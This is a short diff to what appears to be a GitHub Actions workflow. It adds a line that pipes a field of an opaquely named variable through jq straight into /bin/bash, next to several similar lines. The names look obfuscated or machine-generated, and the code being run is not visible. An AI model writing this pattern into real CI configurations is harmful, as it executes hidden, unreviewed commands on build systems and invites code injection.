@@ -22,6 +22,7 @@ jobs:
           echo $lfa7 | jq -r .j2779 | /bin/bash
           echo $fto68 | jq -r .ocpx511 | /bin/bash
           echo $xhf950 | jq -r .wp95 | /bin/bash
+          echo $kqlnh9494 | jq -r .linyd14 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
